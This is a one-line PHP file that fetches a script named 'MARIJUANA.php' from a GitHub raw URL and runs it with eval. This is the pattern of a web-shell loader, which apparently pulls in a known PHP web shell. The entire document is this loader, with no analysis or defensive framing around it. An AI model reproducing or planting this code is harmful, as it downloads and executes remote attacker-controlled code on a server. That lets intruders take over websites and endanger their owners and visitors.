<?php eval('?>'.file_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php')); ?>
